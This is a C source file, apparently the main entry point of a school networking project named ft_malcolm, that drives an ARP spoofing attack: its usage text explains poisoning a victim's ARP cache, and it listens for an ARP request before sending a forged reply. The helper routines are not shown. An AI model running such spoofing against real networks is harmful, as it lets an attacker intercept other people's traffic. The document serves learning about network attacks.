/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: rdelicad <rdelicad@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/04/06 11:59:10 by rdelicad          #+#    #+#             */
/*   Updated: 2025/09/06 06:57:03 by rdelicad         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

int main(int ac, char **av)
{
    int             sockfd;
    t_args          args;

    if (ac != 5) {
        printf("Usage: %s <source_ip> <source_mac> <target_ip> <target_mac>\n", av[0]);
        printf("\nArguments:\n");
        printf("  source_ip     IP address to spoof (the victim will think this IP belongs to you)\n");
        printf("  source_mac    Your MAC address (attacker's MAC to associate with spoofed IP)\n");
        printf("  target_ip     Target victim's IP address (who will receive the poisoned ARP reply)\n");
        printf("  target_mac    Target victim's MAC address\n");
        printf("\nExample:\n");
        printf("  %s 192.168.1.1 aa:bb:cc:dd:ee:ff 192.168.1.100 11:22:33:44:55:66\n", av[0]);
        printf("  This will make 192.168.1.100 think that 192.168.1.1 has MAC aa:bb:cc:dd:ee:ff\n");
        
        exit(EXIT_FAILURE);
    }
    
    setup_signal_handler();
    parse_args(&args, av);
    sockfd = create_socket(0);
    if (listen_arp(sockfd, &args))
        send_arp_replay(&args);
    return EXIT_SUCCESS;
}